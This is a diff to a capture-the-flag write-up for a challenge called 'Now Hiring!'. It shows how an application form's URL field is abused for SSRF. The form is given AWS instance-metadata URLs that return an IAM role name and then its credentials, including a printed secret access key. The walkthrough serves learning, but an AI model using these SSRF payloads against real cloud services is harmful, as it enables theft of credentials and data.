@@ -1,15 +1,19 @@
 <h1 id="objective-10-now-hiring">Objective 10: Now Hiring!</h1>
 <p><strong>Location: <a href="https://apply.jackfrosttower.com/">https://apply.jackfrosttower.com/</a></strong><br>
-<strong>Elf: ?</strong></p>
+<strong>Hints provided by Noxious O. D’or after completion of <a href="https://github.com/joergschwarzwaelder/hhc2021/blob/master/Additional/IMDS%20Exploration.md">IMDS Exploration</a></strong></p>
 <p>This objective is about SSRF.</p>
 <p>The website’s application form consumes the user’s name, resume (as file upload) and the URL to the public NLBI report.</p>
-<p>After the submission, the item retrieved through this URL by the website is shown on the “submission accepted” screen using the URL <a href="https://apply.jackfrosttower.com/images/%7Busername%7D.jpg">https://apply.jackfrosttower.com/images/{username}.jpg</a></p>
+<p>After the submission, the item specified by the URL is retrieved by the website and then shown on the “submission accepted” screen using the URL <a href="https://apply.jackfrosttower.com/images/%7Busername%7D.jpg">https://apply.jackfrosttower.com/images/{username}.jpg</a></p>
 <p>By choosing the right IMDS URLs, the secret access key for the S3 bucket can be retrieved using CURL:</p>
 <p>URL 1 (get role name):</p>
 <pre><code>http://169.254.169.254/latest/meta-data/iam/security-credentials
 </code></pre>
+<p>Result:</p>
+<pre><code>jsw@io:~$ curl https://apply.jackfrosttower.com/images/joergen.jpg
+jf-deploy-role
+</code></pre>
 <p>URL 2 (get security credentials for this role):</p>
-<pre><code>http://169.254.169.254/latest/meta-data/iam/security-credentials/elfu-deploy-role
+<pre><code>http://169.254.169.254/latest/meta-data/iam/security-credentials/jf-deploy-role
 </code></pre>
 <pre><code>jsw@io:~$ curl https://apply.jackfrosttower.com/images/joergen.jpg
 {
@@ -23,4 +27,5 @@
 }
 </code></pre>
 <p>So the secret access key for the S3 bucket is <strong>CGgQcSdERePvGgr058r3PObPq3+0CfraKcsLREpX</strong></p>
+<p><strong>Achievement: SSRF to IMDS to S3 Bucket Access</strong></p>
 
